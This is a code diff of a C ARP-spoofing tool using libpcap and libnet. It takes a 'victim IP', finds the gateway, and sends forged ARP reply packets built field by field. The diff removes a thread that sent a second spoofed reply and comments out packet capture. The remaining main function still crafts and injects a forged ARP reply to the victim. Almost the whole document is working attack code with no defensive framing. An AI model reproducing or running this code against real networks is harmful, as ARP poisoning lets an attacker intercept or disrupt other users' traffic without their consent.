@@ -1,7 +1,6 @@
 #include <pcap.h>
 #include <libnet.h>
 #include <stdio.h>
-#include <pthread.h>
 #include <stdlib.h>
 #include <errno.h>
 #include <sys/socket.h>
@@ -39,14 +38,6 @@ typedef struct arphdr {
 #endif	/* DEBUG_LEVEL_ */
 
 #define MAX_STR_LEN 4000
-
-struct thread_arg{
-    char *vip;
-    char *gatewayip;
-    u_char mac[20];
-    u_char gmac[20];
-    pcap_t *descr;
-};
 
 void callback(u_char *useless, const struct pcap_pkthdr* pkthdr, const u_char* packet)
 {
@@ -237,52 +228,6 @@ char* getGatewayIP(){
     return gateway;
 }
 
-void *t_function(void *data){
-    unsigned char packet[100];
-    struct libnet_ethernet_hdr test;
-    arphdr_t test2;
-    struct thread_arg *arg=(struct thread_arg *)data;
-
-    memset(packet, 0, sizeof(packet));
-
-    for(int i=0; i<6; i++){
-        test.ether_dhost[i]=arg->mac[i];
-    }
-
-    for(int i=0;i<6;i++){
-        test.ether_shost[i]=arg->gmac[i];
-    }
-
-    test.ether_type=htons(ETHERTYPE_ARP);
-
-    test2.htype=htons(1);
-    test2.ptype=htons(ETHERTYPE_IP);
-    test2.hlen=0x06;
-    test2.plen=0x04;
-    test2.oper=htons(ARP_REPLY);
-    for(int i=0;i<6;i++){
-        test2.sha[i]=arg->mac[i];
-    }
-    inet_pton(AF_INET, arg->vip, test2.spa);
-    for(int i=0;i<6;i++){
-        test2.tha[i]=arg->gmac[i];
-    }
-    inet_pton(AF_INET, arg->gatewayip, test2.tpa);
-
-    memcpy(packet, (void *)&test, sizeof(struct libnet_ethernet_hdr));
-    memcpy(packet+sizeof(struct libnet_ethernet_hdr), (void *)&test2, sizeof(arphdr_t));
-
-    sleep(1);
-
-    if(pcap_sendpacket(arg->descr, packet, 60) != 0){
-        fprintf(stderr,"\n Error sending the packet: %s\n", pcap_geterr(arg->descr));
-        exit(-1);
-    }
-
-    printf("thread\n");
-    pthread_exit(0);
-}
-
 int main(int argc, char *argv[])
 {
     char *dev;
@@ -305,9 +250,6 @@ int main(int argc, char *argv[])
 
     u_char vmac[6];
     u_char gmac[6];
-
-    pthread_t thread;
-    int thr_id;
 
     if(argc != 2){
         printf("Please input victim IP\n");
@@ -497,26 +439,11 @@ int main(int argc, char *argv[])
     memcpy(packet, (void *)&test, sizeof(struct libnet_ethernet_hdr));
     memcpy(packet+sizeof(struct libnet_ethernet_hdr), (void *)&test2, sizeof(arphdr_t));
 
-    struct thread_arg arg;
-    arg.descr=descr;
-    arg.gatewayip=gatewayip;
-    arg.vip=argv[1];
-    for(int i=0;i<6;i++){
-        arg.mac[i]=mac[i];
-        arg.gmac[i]=gmac[i];
-    }
-
-    thr_id = pthread_create(&thread, NULL, t_function, (void *)&arg);
-    if(thr_id < 0){
-        perror("thread create error\n");
-        exit(0);
-    }
-
     if(pcap_sendpacket(descr, packet, 60) != 0){
         fprintf(stderr,"\n Error sending the packet: %s\n", pcap_geterr(descr));
         return -1;
     }
 
-    pcap_loop(descr, -1, callback, NULL);
+    //pcap_loop(descr, -1, callback, NULL);
     return 0;
 }
